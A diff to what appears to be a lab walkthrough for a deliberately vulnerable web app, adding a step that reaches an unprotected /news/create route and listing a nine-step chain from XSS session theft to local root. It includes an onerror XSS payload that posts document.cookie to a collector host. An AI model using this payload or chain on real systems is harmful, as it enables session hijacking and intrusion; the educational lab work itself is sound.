@@ -104,7 +104,15 @@ It enables CORS, so the cross-origin `fetch` from the victim's page is allowed.
 
 ### 1d. Register, log in, and post the payload
 
-Register any user at `http://192.168.56.10:5001/register`, log in, then create a post whose **body** is an XSS payload. Because `<script>` is filtered, use an `onerror` handler instead — point it at *your* collector (`192.168.56.20:4000`), not `localhost`:
+Register any user at `http://192.168.56.10:5001/register` and log in — an ordinary, non-admin account.
+
+The **Post News** button is hidden for non-admins, so it looks like you can't post. That's UI only: the route behind it, `/news/create`, is `@login_required` but **not** admin-gated (see [vuln #2](vulnerabilities.md)), so any logged-in user can reach it by guessing the path. Browse straight to it:
+
+```
+http://192.168.56.10:5001/news/create
+```
+
+Submit a post whose **body** is an XSS payload. Because `<script>` is filtered, use an `onerror` handler instead — point it at *your* collector (`192.168.56.20:4000`), not `localhost`:
 
 ```html
 <img src=x onerror="fetch('http://192.168.56.20:4000',{method:'POST',body:JSON.stringify({cookie:document.cookie}),headers:{'Content-type':'application/json'}})">
@@ -305,13 +313,14 @@ frank : trustno1
 | # | Weakness | Alone it looks like… | In the chain it became… |
 |---|----------|----------------------|-------------------------|
 | 1 | Blacklist XSS filter + `\| safe` | "we strip `<script>`" | admin session theft |
-| 2 | `HTTPONLY = False` | "a workaround" | cookie readable by the payload |
-| 3 | f-string in SQL | "it's just an id" | full `users` dump |
-| 4 | MD5, unsalted | "it's hashed" | instant credential crack |
-| 5 | Password reuse | "same admin everywhere" | lateral move to app #2 |
-| 6 | `startswith` path check | "it's restricted" | arbitrary file read |
-| 7 | Secret typed into history | "harmless typo" | SSH foothold |
-| 8 | Unpatched kernel | "we'll patch later" | local root |
+| 2 | Hidden button, open route | "normal users can't post" | low-priv user plants the payload |
+| 3 | `HTTPONLY = False` | "a workaround" | cookie readable by the payload |
+| 4 | f-string in SQL | "it's just an id" | full `users` dump |
+| 5 | MD5, unsalted | "it's hashed" | instant credential crack |
+| 6 | Password reuse | "same admin everywhere" | lateral move to app #2 |
+| 7 | `startswith` path check | "it's restricted" | arbitrary file read |
+| 8 | Secret typed into history | "harmless typo" | SSH foothold |
+| 9 | Unpatched kernel | "we'll patch later" | local root |
 
 No single bug is exotic. The compromise is the **sum**.
 
